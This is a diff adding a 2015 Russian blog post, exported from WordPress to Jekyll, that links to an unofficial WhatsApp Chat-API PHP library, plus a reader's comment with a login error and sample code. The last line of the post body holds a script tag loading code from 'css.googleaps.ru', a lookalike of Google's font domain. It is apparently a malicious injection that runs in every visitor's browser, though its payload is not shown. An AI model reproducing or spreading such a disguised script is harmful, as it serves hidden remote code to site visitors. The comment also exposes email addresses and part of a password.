@@ -1,0 +1,61 @@
+---
+layout: post
+status: publish
+published: true
+title: 'WhatsApp API: Библиотека работы с мессенджером'
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: |+
+  Представляю вашему вниманию первый (в моей памяти) whatsapp api иннтерфейс
+
+  Умеет делать все. Скорее всего скоро мне станет известно про&nbsp; VIber api, т.к. очень много стал получать спама.
+
+wordpress_id: 1327
+wordpress_url: http://devdocs.ru/?p=518
+date: '2015-05-22 13:08:02 +0200'
+date_gmt: '2015-05-22 13:08:02 +0200'
+categories:
+- PHP
+tags:
+- git
+- api
+comments:
+- id: 412
+  author: kurban
+  author_email: kurbanovkf@mail.ru
+  author_url: ''
+  date: '2015-11-25 16:52:19 +0200'
+  date_gmt: '2015-11-25 16:52:19 +0200'
+  content: "Кто нибудь знает как работать с этим API (WhatsApp)? \r\nУ меня выходит
+    ошибка: Fatal error: Uncaught exception 'LoginFailureException' in ..\\Chat-API-master\\src\\Login.php:53
+    Stack trace: #0 ..\\Chat-API-master\\src\\whatsprot.class.php(279): Login->doLogin()
+    #1 ..\\Chat-API-master\\waphp.php(53): WhatsProt->loginWithPassword('Okm7pjch3oldcmF...')
+    #2 {main} thrown in ..\\Chat-API-master\\src\\Login.php on line 53\r\n\r\nВот
+    мой код: waphp.php\r\n<?php\r\nini_set(&#039;display_errors&#039;,1);\r\nerror_reporting(E_ALL);\r\n\r\n&#47;&#47;
+    Проверка подключения сокетов\r\necho &#039;Create socket ... &#039;; \r\nif (($sock
+    = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {     \r\n    echo \"WebSockets
+    UNAVAILABLE:\";\r\n    throw new Exception('socket_create() failed: '.socket_strerror(socket_last_error()).\"\\n\");
+    \r\n} else {    \r\n    echo \" WebSockets OK \"; \r\n}\r\n\r\nrequire_once 'src&#47;whatsprot.class.php';\r\n$id
+    = \"...\"; &#47;&#47;мой id\r\n$username = \"...\"; &#47;&#47;Мой номер телефона,
+    без знака \"+\"\r\n$nickname = '...';  &#47;&#47; Мой никнэйм \r\n$password =
+    '...'; &#47;&#47;пароль из WART\r\n\r\n$debug = True;\r\n$log = true;\r\n\r\nrequire
+    '&#47;src&#47;events&#47;MyEvents.php';\r\n \r\n$w = new WhatsProt($username,
+    $nickname, $debug, $log); &#47;&#47;Name your application by replacing \"WhatsApp
+    Messaging\"\r\n$events = new MyEvents ( $w );\r\n$events -> setEventsToListenFor(
+    $events -> activeEvents );\r\n\r\n$w -> Connect();\r\n$w -> loginWithPassword($password);\r\n
+    \r\n&#47;&#47;Создание экземпляра класса регистрации\r\n$r = new Registration($username,
+    $debug);\r\n$r -> codeRequest('sms');\r\n\r\n$target = '...'; &#47;&#47;Целевой
+    телефон, телефон принимающего\r\n$message = 'Cообщение'; &#47;&#47; сообщение\r\n
+    \r\n$w -> sendPresenceSubscription($target); &#47;&#47;Сначала отправить присутствие
+    пользователя\r\n$w -> SendMessage($target,$message); &#47;&#47; Отправить сообщение\r\n?>\r\n\r\nМожет
+    код нужно поменять..?"
+---
+<p>Представляю вашему вниманию первый (в моей памяти) whatsapp api иннтерфейс</p>
+<p>Умеет делать все. Скорее всего скоро мне станет известно про&nbsp; VIber api, т.к. очень много стал получать спама.</p>
+<p><a id="more"></a><a id="more-1327"></a></p>
+<p>https:&#47;&#47;github.com&#47;mgp25&#47;Chat-API<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
